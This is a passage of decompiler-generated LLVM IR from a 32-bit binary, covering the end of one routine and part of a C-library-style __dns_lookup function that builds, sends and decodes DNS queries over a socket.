  store i32 %v1_17998, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_179b4

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17988
  %v2_179a0 = icmp eq i8 %v2_17968, 0
  %v1_179a4 = add i32 %v0_179a4, 1
  store i32 %v1_179a4, i32* %r0.global-to-local, align 4
  br i1 %v2_179a0, label %dec_label_pc_179b4, label %dec_label_pc_179ac

dec_label_pc_179ac:                               ; preds = %dec_label_pc_179a0
  %v1_179ac = and i32 %v6_17974, 32
  %v2_179ac = icmp eq i32 %v1_179ac, 0
  br i1 %v2_179ac, label %dec_label_pc_179f4, label %dec_label_pc_179b4

dec_label_pc_179b4:                               ; preds = %dec_label_pc_179ac, %dec_label_pc_179a0, %dec_label_pc_17998
  %v0_1793825 = phi i32 [ %v1_179a4, %dec_label_pc_179ac ], [ %v1_179a4, %dec_label_pc_179a0 ], [ %v1_17998, %dec_label_pc_17998 ]
  %v4_179b4 = mul i32 %v1_179b4, 256
  %v5_179b4 = or i32 %v0_179b4, %v4_179b4
  %v1_179b8 = add nuw nsw i32 %v0_179b8, 1
  %v7_179c0 = icmp slt i32 %v1_179b8, 5
  br i1 %v7_179c0, label %dec_label_pc_17930, label %dec_label_pc_179c4

dec_label_pc_17930.lr.ph:                         ; preds = %entry
  %v2_17934.pre = load i32, i32* @global_var_29594, align 4
  br label %dec_label_pc_17930

dec_label_pc_179c4:                               ; preds = %dec_label_pc_179b4
  %v2_179c4 = icmp eq i32 %arg2, 0
  br i1 %v2_179c4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_179c4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_179c4
  %v3_179e0 = call i32 @llvm.bswap.i32(i32 %v5_179b4)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_179ec = inttoptr i32 %arg2 to i32*
  store i32 %v3_179e0, i32* %v3_179ec, align 4
  %v2_179f0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_179f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_179f0 = phi i32 [ 1, %bb ], [ %v17_179f0.pre, %bb41 ]
  %v2_179f0 = phi i32 [ %v3_17918, %bb ], [ %v2_179f0.pre, %bb41 ]
  store i32 %v2_179f0, i32* @r4, align 4
  ret i32 %v17_179f0

dec_label_pc_179f4:                               ; preds = %dec_label_pc_17990, %dec_label_pc_179ac, %dec_label_pc_17930, %dec_label_pc_17950, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_17918, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_17934.pre, { 2, 1, 0 }
  uselistorder i32 %v1_179b8, { 1, 0 }
  uselistorder i32 %v0_179a4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_17918, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_179f4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_17968, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_17a00 = load i32, i32* @r4, align 4
  %v6_17a00 = load i32, i32* @r5, align 4
  %v9_17a00 = load i32, i32* @r6, align 4
  %v12_17a00 = load i32, i32* @r7, align 4
  %v15_17a00 = load i32, i32* @r8, align 4
  %v18_17a00 = load i32, i32* @sb, align 4
  %v21_17a00 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_17a20 = call i32 @malloc(i32 512)
  store i32 %v1_17a20, i32* @r7, align 4
  %v1_17a2c = call i32 @malloc(i32 1025)
  %v2_17a30 = icmp eq i32 %v1_17a2c, 0
  br i1 %v2_17a30, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_17a34 = load i32, i32* @r7, align 4
  %v3_17a34 = icmp eq i32 %v1_17a34, 0
  store i32 %v1_17a2c, i32* %stack_var_-236, align 4
  br i1 %v3_17a34, label %bb195, label %dec_label_pc_17a48

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_18128

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_18128

dec_label_pc_17a48:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_17a4c = icmp eq i32 %arg3, 0
  br i1 %v2_17a4c, label %dec_label_pc_18128, label %dec_label_pc_17a54

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a48
  %v2_17a58 = load i8, i8* %arg1, align 1
  %v2_17a5c = icmp eq i8 %v2_17a58, 0
  br i1 %v2_17a5c, label %dec_label_pc_18128, label %dec_label_pc_17a64

dec_label_pc_17a64:                               ; preds = %dec_label_pc_17a54
  %v3_17a68 = call i32 @strlen(i8* nonnull %arg1)
  %v2_17a70 = add i32 %v3_17a68, %tmp
  %v1_17a74 = add i32 %v2_17a70, -1
  %v2_17a74 = inttoptr i32 %v1_17a74 to i8*
  %v3_17a74 = load i8, i8* %v2_17a74, align 1
  %v2_17a78 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_17a78, i32* @r4, align 4
  %v7_17a7c = icmp eq i8 %v3_17a74, 46
  %. = zext i1 %v7_17a7c to i32
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_17aa0 = call i32 @__pthread_return_void()
  %v1_17ab0 = call i32 @__pthread_return_0()
  %v2_17abc = load i32, i32* @global_var_2fb80.1279, align 4
  %v2_17ac0 = srem i32 %v2_17abc, %arg3
  %v3_17ac8 = load i8, i8* @global_var_298d5.1282, align 1
  %v4_17ac8 = zext i8 %v3_17ac8 to i32
  %v2_17acc = load i8, i8* bitcast (i8** @global_var_298d4.1281 to i8*), align 4
  %v3_17acc = zext i8 %v2_17acc to i32
  %v4_17ad4 = mul nuw nsw i32 %v4_17ac8, 256
  %v5_17ad4 = or i32 %v3_17acc, %v4_17ad4
  store i32 %v5_17ad4, i32* @sb, align 4
  store i32 %v2_17ac0, i32* @sl, align 4
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_17ae8 = call i32 @__pthread_return_void()
  %v0_17af4 = load i32, i32* @r5, align 4
  %v2_17b14 = ptrtoint i8* %stack_var_-188 to i32
  %v6_17b58 = bitcast i8* %stack_var_-188 to i32*
  %v2_17c38 = ptrtoint i32* %stack_var_-92 to i32
  %v3_17cd0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_17d34 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_18080 = icmp eq i1 %v7_17a7c, false
  %v7_17d88 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_17e6c = ptrtoint i32* %stack_var_-140 to i32
  %v9_17f64 = icmp eq i32 %tmp147, %arg2
  %v7_17ef8 = icmp eq i32 %arg2, 1
  %v2_17ea0 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_17af4, 3
  br i1 %tmp292, label %dec_label_pc_17afc.lr.ph.preheader.lr.ph, label %dec_label_pc_18134

dec_label_pc_17afc.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_17a64
  %v2_17e0c = icmp eq i32 %tmp156, 0
  %v8_17efc = icmp eq i32 %arg2, 28
  br label %dec_label_pc_17afc.lr.ph.preheader

dec_label_pc_17afc:                               ; preds = %dec_label_pc_17afc.lr.ph, %dec_label_pc_18118.backedge
  %v1_17b04 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_17afc.lr.ph ], [ %v0_17cac, %dec_label_pc_18118.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_17afc.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_18118.backedge ]
  %v7_17b00 = icmp eq i32 %v1_17b04, -1
  br i1 %v7_17b00, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_17afc
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_17afc, %bb199
  %v1_17b08 = xor i1 %v7_17b00, true
  call void @__pseudo_cond_branch(i1 %v1_17b08, i32 ptrtoint (i32* @global_var_127b4.1284 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_17b14, i32* @r4, align 4
  %v0_17b18 = load i32, i32* @r7, align 4
  %v2_17b1c = inttoptr i32 %v0_17b18 to i8*
  %v3_17b1c = call i32 @__GI_memset(i8* %v2_17b1c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_17b2c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_17b30 = load i32, i32* @sb, align 4
  %v1_17b30 = add i32 %v0_17b30, 1
  %v3_17b38 = urem i32 %v1_17b30, 65536
  store i32 %v3_17b38, i32* @sb, align 4
  %v0_17b44 = load i32, i32* @r7, align 4
  %v5_17b50 = trunc i32 %v1_17b30 to i8
  store i8 %v5_17b50, i8* %stack_var_-188, align 1
  %v7_17b58 = call i32 @__encode_header(i32* %v6_17b58, i32 %v0_17b44, i32 512, i32 1, i32 %v1_17b30)
  store i32 %v7_17b58, i32* @r5, align 4
  %v1_17b5c = icmp slt i32 %v7_17b58, 0
  br i1 %v1_17b5c, label %dec_label_pc_18134, label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_17b6c = load i32, i32* %stack_var_-236, align 4
  %v4_17b70 = call i32 @strncpy(i32 %v2_17b6c, i32 %tmp, i32 1025)
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_17b88 = call i32 @__pthread_return_void()
  %v1_17b98 = call i32 @__pthread_return_0()
  %v1_17ba8 = load i32, i32* @sl, align 4
  %v4_17ba8 = mul i32 %v1_17ba8, 4
  %v5_17ba8 = add i32 %v4_17ba8, %arg4
  %v6_17ba8 = inttoptr i32 %v5_17ba8 to i32*
  %v7_17ba8 = load i32, i32* %v6_17ba8, align 4
  store i32 %v7_17ba8, i32* @r6, align 4
  br i1 %v1_17ba4, label %dec_label_pc_17bec, label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17b64
  %v2_17bb8 = load i32, i32* @global_var_2fc50.1287, align 4
  %v6_17bc0 = icmp slt i32 %v6_180dc, %v2_17bb8
  br i1 %v6_17bc0, label %dec_label_pc_17bc4, label %dec_label_pc_17bec

dec_label_pc_17bc4:                               ; preds = %dec_label_pc_17bb0
  store i32 ptrtoint (i32* @global_var_20f10.1289 to i32), i32* @r1, align 4
  %v2_17bcc = load i32, i32* %stack_var_-236, align 4
  %v4_17bd0 = inttoptr i32 %v2_17bcc to i8*
  %v5_17bd0 = call i32 @__GI_strncat(i8* %v4_17bd0, i32 ptrtoint (i32* @global_var_20f10.1289 to i32), i32 1025, i32 %v2_17bb8)
  %v7_17be0 = load i32, i32* %v6_17be0, align 4
  store i32 %v7_17be0, i32* @r1, align 4
  %v4_17be8 = inttoptr i32 %v2_17bcc to i8*
  %v5_17be8 = call i32 @__GI_strncat(i8* %v4_17be8, i32 %v7_17be0, i32 1025, i32 ptrtoint (i32* @global_var_2fc30.1291 to i32))
  br label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17bb0, %dec_label_pc_17b64, %dec_label_pc_17bc4
  store i32 %v2_17a78, i32* @r0, align 4
  store i32 97280, i32* @lr, align 4
  %v1_17bfc = call i32 @__pthread_return_void()
  %v2_17c08 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_17c08, i32* %stack_var_-56, align 4
  %v0_17c18 = load i32, i32* @r7, align 4
  %v1_17c18 = load i32, i32* @r5, align 4
  %v2_17c18 = add i32 %v1_17c18, %v0_17c18
  %v1_17c1c = sub i32 512, %v1_17c18
  %v8_17c24 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_17c18, i32 %v1_17c1c, i32 %arg2, i32 %v2_17c08, i32 %arg2, i32 1)
  store i32 %v8_17c24, i32* @fp, align 4
  %v1_17c28 = icmp slt i32 %v8_17c24, 0
  br i1 %v1_17c28, label %dec_label_pc_18134, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17bec
  store i32 0, i32* @r4, align 4
  %v0_17c40 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_17c4c = inttoptr i32 %v0_17c40 to i8*
  %v4_17c4c = call i32 @inet_pton(i32 10, i8* %v3_17c4c, i32 %v2_17c38)
  %v1_17c50 = load i32, i32* @r4, align 4
  %v7_17c54 = icmp sgt i32 %v4_17c4c, %v1_17c50
  br i1 %v7_17c54, label %bb201, label %dec_label_pc_17c30..thread11_crit_edge

dec_label_pc_17c30..thread11_crit_edge:           ; preds = %dec_label_pc_17c30
  %v3_17c60.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_17c30
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_17c30..thread11_crit_edge, %bb201
  %v3_17c60 = phi i8 [ %v3_17c60.pre, %dec_label_pc_17c30..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_17c60 = sext i8 %v3_17c60 to i32
  %v8_17c5c.op = urem i32 %v1_17c50, 256
  %v8_17c5c.op.op = mul nuw nsw i32 %v8_17c5c.op, 256
  %v4_17c68 = select i1 %v7_17c54, i32 %v8_17c5c.op.op, i32 0
  %v5_17c68 = or i32 %v4_17c60, %v4_17c68
  %v7_17c6c = icmp eq i32 %v5_17c68, 10
  br i1 %v7_17c6c, label %dec_label_pc_17c98, label %dec_label_pc_17c80

dec_label_pc_17c80:                               ; preds = %.thread11
  %v0_17c84 = load i32, i32* @r6, align 4
  store i32 %v0_17c84, i32* @r0, align 4
  %v1_17c90 = call i32 @inet_addr(i32 %v0_17c84)
  br label %dec_label_pc_17c98

dec_label_pc_17c98:                               ; preds = %.thread11, %dec_label_pc_17c80
  %v0_17cac = call i32 @socket()
  %v1_17cb0 = icmp slt i32 %v0_17cac, 0
  br i1 %v1_17cb0, label %.thread, label %dec_label_pc_17cc8

.thread:                                          ; preds = %dec_label_pc_17c98
  br label %dec_label_pc_18118.backedge

dec_label_pc_18118.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_17afc, label %dec_label_pc_18134

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17c98
  %v4_17cd0 = call i32 @__libc_connect(i32 %v0_17cac, %sockaddr* nonnull %v3_17cd0, i32 28)
  %v1_17cd4 = icmp slt i32 %v4_17cd0, 0
  br i1 %v1_17cd4, label %dec_label_pc_17cdc, label %dec_label_pc_17cfc

dec_label_pc_17cdc:                               ; preds = %dec_label_pc_17cc8
  %v0_17cdc = call i32 @__errno_location()
  %v1_17ce0 = inttoptr i32 %v0_17cdc to i32*
  %v2_17ce0 = load i32, i32* %v1_17ce0, align 4
  %v7_17ce4 = icmp eq i32 %v2_17ce0, 101
  br i1 %v7_17ce4, label %dec_label_pc_18048, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_17cdc
  br label %dec_label_pc_18118.backedge

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cc8
  %v0_17cfc = load i32, i32* @r5, align 4
  %v1_17cfc = load i32, i32* @fp, align 4
  %v2_17cfc = add i32 %v1_17cfc, %v0_17cfc
  %v0_17d00 = load i32, i32* @r7, align 4
  %v4_17d0c = inttoptr i32 %v0_17d00 to i32*
  %v5_17d0c = call i32 @__libc_send(i32 %v0_17cac, i32* %v4_17d0c, i32 %v2_17cfc, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_17cac, i32* %stack_var_-44, align 4
  %v11_17d34 = call i32 @__libc_poll(%pollfd* %v10_17d34, i32 1, i32 10000, i32 1, i32 %v0_17cac, i32 1, i32 0)
  %v1_17d38 = load i32, i32* @r4, align 4
  %v7_17d3c = icmp sgt i32 %v11_17d34, %v1_17d38
  br i1 %v7_17d3c, label %dec_label_pc_17d40, label %dec_label_pc_18048

dec_label_pc_17d40:                               ; preds = %dec_label_pc_17cfc
  %v0_17d48 = load i32, i32* @r7, align 4
  %v4_17d50 = inttoptr i32 %v0_17d48 to i32*
  %v5_17d50 = call i32 @__libc_recv(i32 %v0_17cac, i32* %v4_17d50, i32 512, i32 %v1_17d38)
  store i32 %v5_17d50, i32* @fp, align 4
  %v7_17d5c = icmp slt i32 %v5_17d50, 12
  br i1 %v7_17d5c, label %dec_label_pc_1807c, label %dec_label_pc_17d60

dec_label_pc_17d60:                               ; preds = %dec_label_pc_17d40
  %v0_17d60 = load i32, i32* @r7, align 4
  %v2_17d68 = inttoptr i32 %v0_17d60 to i8*
  %v3_17d68 = call i32 @__decode_header(i8* %v2_17d68, i32 %v2_17b14)
  %v3_17d6c = load i8, i8* %stack_var_-188, align 1
  %v4_17d6c = sext i8 %v3_17d6c to i32
  store i32 %v4_17d6c, i32* @r6, align 4
  %v1_17d70 = load i32, i32* @sb, align 4
  %v9_17d70 = icmp eq i32 %v4_17d6c, %v1_17d70
  br i1 %v9_17d70, label %dec_label_pc_17d78, label %dec_label_pc_1807c

dec_label_pc_17d78:                               ; preds = %dec_label_pc_17d60
  %v1_17d7c = load i32, i32* @r4, align 4
  %v9_17d7c = icmp eq i32 %tmp157, %v1_17d7c
  br i1 %v9_17d7c, label %dec_label_pc_1807c, label %dec_label_pc_17d84

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17d78
  br i1 %v7_17d88, label %dec_label_pc_17d90, label %dec_label_pc_17e0c

dec_label_pc_17d90:                               ; preds = %dec_label_pc_17d84
  %v9_17d94 = icmp eq i32 %., %v1_17d7c
  br i1 %v9_17d94, label %dec_label_pc_17d9c, label %dec_label_pc_17e00

dec_label_pc_17d9c:                               ; preds = %dec_label_pc_17d90
  store i32 %v2_17a78, i32* @r5, align 4
  store i32 %v2_17a78, i32* @r0, align 4
  %v1_17db4 = call i32 @__pthread_return_void()
  %v1_17dc4 = call i32 @__pthread_return_0()
  store i32 %v2_17a78, i32* @r0, align 4
  %v2_17dd0 = load i32, i32* @global_var_2fc50.1287, align 4
  %v1_17de0 = call i32 @__pthread_return_void()
  %v1_17de8 = add i32 %v2_17dd0, -1
  store i32 %v1_17de8, i32* @r4, align 4
  %v5_17df0 = icmp slt i32 %v6_180dc, %v1_17de8
  br i1 %v5_17df0, label %.thread19, label %dec_label_pc_17e00

.thread19:                                        ; preds = %dec_label_pc_17d9c
  %v7_17df0 = add i32 %v6_180dc, 1
  %v6_17df4 = load i32, i32* @r6, align 4
  store i32 %v6_17df4, i32* @sb, align 4
  br label %dec_label_pc_18118.outer.backedge

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17d9c, %dec_label_pc_17d90
  %v0_17e00 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_17e30

dec_label_pc_17e0c:                               ; preds = %dec_label_pc_17d84
  br i1 %v2_17e0c, label %dec_label_pc_17e14, label %dec_label_pc_1807c

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17e0c
  br i1 %tmp198, label %dec_label_pc_17e28, label %dec_label_pc_17e40.preheader

dec_label_pc_17e40.preheader:                     ; preds = %dec_label_pc_17e14
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_17e40

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17e14
  %v0_17e28 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_17e30

dec_label_pc_17e30:                               ; preds = %dec_label_pc_17e00, %dec_label_pc_17e28
  %storemerge4 = phi i32 [ %v0_17e28, %dec_label_pc_17e28 ], [ %v0_17e00, %dec_label_pc_17e00 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_17e28 ], [ 1, %dec_label_pc_17e00 ]
  %v2_17e30 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_17e30, align 4
  br label %dec_label_pc_18144

dec_label_pc_17e38:                               ; preds = %dec_label_pc_17e40
  %v2_17e38 = call i32 @__length_question(i32 %v0_17e4c, i32 %v0_17e48)
  %v0_17e3c = load i32, i32* @r5, align 4
  %v2_17e3c = add i32 %v0_17e3c, %v2_17e38
  store i32 %v2_17e3c, i32* @r5, align 4
  %v0_17e44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e40

dec_label_pc_17e40:                               ; preds = %dec_label_pc_17e40.preheader, %dec_label_pc_17e38
  %v0_17e48 = phi i32 [ 12, %dec_label_pc_17e40.preheader ], [ %v2_17e3c, %dec_label_pc_17e38 ]
  %v0_17e50 = phi i32 [ 0, %dec_label_pc_17e40.preheader ], [ %v0_17e44.pre, %dec_label_pc_17e38 ]
  store i32 %v0_17e48, i32* @r1, align 4
  %v0_17e4c = load i32, i32* @r7, align 4
  store i32 %v0_17e4c, i32* @r0, align 4
  %v1_17e50 = add i32 %v0_17e50, 1
  store i32 %v1_17e50, i32* @r4, align 4
  %v5_17e54 = icmp slt i32 %v0_17e50, 1
  br i1 %v5_17e54, label %dec_label_pc_17e38, label %dec_label_pc_17e58

dec_label_pc_17e58:                               ; preds = %dec_label_pc_17e40
  br label %dec_label_pc_17fb4

dec_label_pc_17e6c:                               ; preds = %bb205
  store i32 %v2_17e6c, i32* @r4, align 4
  %v0_17e70 = load i32, i32* @r7, align 4
  %v0_17e78 = load i32, i32* @fp, align 4
  %v5_17e80 = call i32 @__decode_answer(i32 %v0_17e70, i32 %v0_17e74, i32 %v0_17e78, i32* nonnull %stack_var_-140)
  %v1_17e84 = icmp slt i32 %v5_17e80, 0
  br i1 %v1_17e84, label %dec_label_pc_17e90, label %dec_label_pc_17eac

dec_label_pc_17e90:                               ; preds = %dec_label_pc_17e6c
  %v2_17e94 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_17e94, label %dec_label_pc_1807c, label %dec_label_pc_17e9c

dec_label_pc_17e9c:                               ; preds = %dec_label_pc_17e90
  br i1 %v2_17ea0, label %dec_label_pc_1807c, label %dec_label_pc_17fc8

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17e6c
  %v2_17eb0 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_17eb0, label %dec_label_pc_17f54, label %dec_label_pc_17eb8

dec_label_pc_17eb8:                               ; preds = %dec_label_pc_17eac
  %v0_17eb8 = load i32, i32* @r8, align 4
  %v6_17ebc = add i32 %v0_17eb8, 36
  %v7_17ebc = inttoptr i32 %v6_17ebc to i32*
  %v8_17ebc = load i32, i32* %v7_17ebc, align 4
  store i32 %v8_17ebc, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_17e6c, i32* @r1, align 4
  store i32 %v0_17eb8, i32* @r0, align 4
  %v0_17ed8 = call i32 @memcpy()
  %v0_17edc = load i32, i32* @r8, align 4
  %v1_17edc = add i32 %v0_17edc, 4
  %v2_17edc = inttoptr i32 %v1_17edc to i32*
  %v3_17edc = load i32, i32* %v2_17edc, align 4
  %v7_17ee0 = icmp eq i32 %v3_17edc, 24
  br i1 %v7_17ee0, label %dec_label_pc_17f04, label %dec_label_pc_17ee8

dec_label_pc_17ee8:                               ; preds = %dec_label_pc_17eb8
  %v1_17ee8 = add i32 %v0_17edc, 28
  %v2_17ee8 = inttoptr i32 %v1_17ee8 to i32*
  %v3_17ee8 = load i32, i32* %v2_17ee8, align 4
  %v2_17eec = icmp eq i32 %v3_17ee8, 0
  br i1 %v2_17eec, label %dec_label_pc_17fc8, label %dec_label_pc_17ef4

dec_label_pc_17ef4:                               ; preds = %dec_label_pc_17ee8
  br i1 %v7_17ef8, label %dec_label_pc_17f04, label %bb203

bb203:                                            ; preds = %dec_label_pc_17ef4
  br i1 %v8_17efc, label %dec_label_pc_17f04, label %dec_label_pc_17fc8

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17ef4, %bb203, %dec_label_pc_17eb8
  %v9_17f08 = icmp eq i32 %v3_17edc, %arg2
  br i1 %v9_17f08, label %dec_label_pc_17f1c, label %dec_label_pc_17f10

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17f04
  %v1_17f10 = inttoptr i32 %v0_17edc to i32*
  %v2_17f10 = load i32, i32* %v1_17f10, align 4
  %v1_17f14 = call i32 @free(i32 %v2_17f10)
  br label %dec_label_pc_17fa0

dec_label_pc_17f1c:                               ; preds = %dec_label_pc_17f04
  %v1_17f24 = add i32 %v0_17edc, 16
  %v2_17f24 = inttoptr i32 %v1_17f24 to i32*
  %v3_17f24 = load i32, i32* %v2_17f24, align 4
  %v2_17f28 = sub i32 %tmp155, %stack_var_-192.0
  %v1_17f2c = add i32 %v2_17f28, -1
  %v1_17f30 = add i32 %v3_17f24, 4
  %v2_17f34 = mul i32 %v1_17f30, %v1_17f2c
  %v1_17f38 = add i32 %v0_17edc, 32
  %v2_17f38 = inttoptr i32 %v1_17f38 to i32*
  %v3_17f38 = load i32, i32* %v2_17f38, align 4
  %v2_17f40 = add i32 %v0_17edc, 36
  %v3_17f40 = inttoptr i32 %v2_17f40 to i32*
  store i32 %v1_17f2c, i32* %v3_17f40, align 4
  %tmp294 = icmp ugt i32 %v2_17f34, %v3_17f38
  br i1 %tmp294, label %dec_label_pc_17fc8, label %dec_label_pc_17f1c.dec_label_pc_17f9c_crit_edge

dec_label_pc_17f1c.dec_label_pc_17f9c_crit_edge:  ; preds = %dec_label_pc_17f1c
  %v1_17f9c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17f54:                               ; preds = %dec_label_pc_17eac
  %v3_17f54 = load i32, i32* %stack_var_-140, align 4
  %v1_17f58 = call i32 @free(i32 %v3_17f54)
  br i1 %v9_17f64, label %dec_label_pc_17f6c, label %dec_label_pc_17fa0

dec_label_pc_17f6c:                               ; preds = %dec_label_pc_17f54
  %v0_17f6c = load i32, i32* @r8, align 4
  %v1_17f6c = add i32 %v0_17f6c, 16
  %v2_17f6c = inttoptr i32 %v1_17f6c to i32*
  %v3_17f6c = load i32, i32* %v2_17f6c, align 4
  %v9_17f74 = icmp eq i32 %v3_17f6c, %tmp146
  br i1 %v9_17f74, label %dec_label_pc_17f7c, label %dec_label_pc_18074

dec_label_pc_17f7c:                               ; preds = %dec_label_pc_17f6c
  %v1_17f7c = add i32 %v0_17f6c, 36
  %v2_17f7c = inttoptr i32 %v1_17f7c to i32*
  %v3_17f7c = load i32, i32* %v2_17f7c, align 4
  %v1_17f80 = add i32 %v0_17f6c, 28
  %v2_17f80 = inttoptr i32 %v1_17f80 to i32*
  %v3_17f80 = load i32, i32* %v2_17f80, align 4
  %v3_17f84 = mul i32 %v3_17f7c, %tmp146
  %v4_17f84 = add i32 %v3_17f80, %v3_17f84
  store i32 %v4_17f84, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_17f90 = call i32 @memcpy()
  %v0_17f94 = load i32, i32* @r8, align 4
  %v1_17f94 = add i32 %v0_17f94, 36
  %v2_17f94 = inttoptr i32 %v1_17f94 to i32*
  %v3_17f94 = load i32, i32* %v2_17f94, align 4
  %v1_17f98 = add i32 %v3_17f94, 1
  br label %dec_label_pc_17f9c

dec_label_pc_17f9c:                               ; preds = %dec_label_pc_17f1c.dec_label_pc_17f9c_crit_edge, %dec_label_pc_17f7c
  %v1_17f9c = phi i32 [ %v0_17f94, %dec_label_pc_17f7c ], [ %v1_17f9c.pre, %dec_label_pc_17f1c.dec_label_pc_17f9c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_17f98, %dec_label_pc_17f7c ], [ 0, %dec_label_pc_17f1c.dec_label_pc_17f9c_crit_edge ]
  %v2_17f9c = add i32 %v1_17f9c, 36
  %v3_17f9c = inttoptr i32 %v2_17f9c to i32*
  store i32 %storemerge5, i32* %v3_17f9c, align 4
  br label %dec_label_pc_17fa0

dec_label_pc_17fa0:                               ; preds = %dec_label_pc_17f54, %dec_label_pc_17f10, %dec_label_pc_17f9c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_17f9c ], [ 0, %dec_label_pc_17f54 ], [ %stack_var_-212.2, %dec_label_pc_17f10 ]
  %v1_17fa8 = add i32 %stack_var_-192.0, 1
  %v0_17fb0 = load i32, i32* @r5, align 4
  %v2_17fb0 = add i32 %v0_17fb0, %v5_17e80
  store i32 %v2_17fb0, i32* @r5, align 4
  br label %dec_label_pc_17fb4

dec_label_pc_17fb4:                               ; preds = %dec_label_pc_17e58, %dec_label_pc_17fa0
  %v0_17e74 = phi i32 [ %v0_17e48, %dec_label_pc_17e58 ], [ %v2_17fb0, %dec_label_pc_17fa0 ]
